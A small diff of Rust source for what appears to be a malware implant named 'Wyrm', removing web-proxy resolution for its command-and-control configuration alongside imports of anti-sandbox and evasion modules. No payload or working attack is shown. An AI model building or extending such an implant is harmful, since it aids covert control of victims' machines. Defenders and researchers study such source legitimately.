@@ -10,7 +10,7 @@ use crate::{
     anti_sandbox::anti_sandbox,
     comms::configuration_connection,
     evasion::run_evasion,
-    utils::{console::init_agent_console, proxy::resolve_web_proxy},
+    utils::console::init_agent_console,
     wyrm::{Wyrm, calculate_sleep_seconds},
 };
 
@@ -34,10 +34,6 @@ pub fn start_wyrm() {
     // Initialise the implant
     //
     let mut implant = Wyrm::new();
-    // We need the implant instantiated to resolve the proxy, bit gross, might refactor later.
-    // Fine for now.
-    let proxy = resolve_web_proxy(&implant).unwrap_or_default();
-    implant.c2_config.proxy = proxy;
 
     //
     // Enter the core loop
